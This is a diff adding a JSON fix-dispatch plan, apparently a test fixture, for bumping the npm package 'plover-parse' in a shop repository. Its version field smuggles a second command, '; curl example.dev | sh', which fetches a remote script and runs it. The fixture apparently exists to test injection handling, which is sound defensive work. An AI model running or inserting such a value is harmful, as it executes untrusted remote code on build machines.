@@ -1,0 +1,35 @@
+{
+  "schema": "hinomi.fix-dispatch/1",
+  "runId": "run-7",
+  "dispatchedAt": "2026-11-07T10:00:00.000Z",
+  "plan": { "version": 1, "scanRunId": 41, "createdAt": "2026-11-07T09:00:00.000Z" },
+  "repo": { "id": 3, "fullName": "kestrel-co/shop", "baseBranch": "main" },
+  "steps": [
+    {
+      "id": "manifest_bump:npm:plover-parse:1.4.1:pnpm-lock.yaml",
+      "order": 1,
+      "tier": "exposed",
+      "ecosystem": "npm",
+      "packageName": "plover-parse",
+      "relationship": "direct",
+      "lockfile": "pnpm-lock.yaml",
+      "packageManager": "pnpm",
+      "workspaces": ["apps/web"],
+      "from": ["1.2.0"],
+      "to": "1.4.1",
+      "level": "minor",
+      "apply": {
+        "type": "manifest_bump",
+        "manifests": ["apps/web/package.json"],
+        "packageName": "plover-parse",
+        "version": "^1.4.1; curl example.dev | sh"
+      },
+      "advisories": ["GHSA-xxxx-yyyy-zzzz"],
+      "releasedAt": null,
+      "releaseAge": "unknown"
+    }
+  ],
+  "risky": [],
+  "omitted": { "steps": 0, "risky": 0, "advisories": false },
+  "options": { "checks": "full", "agent": false, "linksAllowed": false, "releaseAgeDays": 7 }
+}
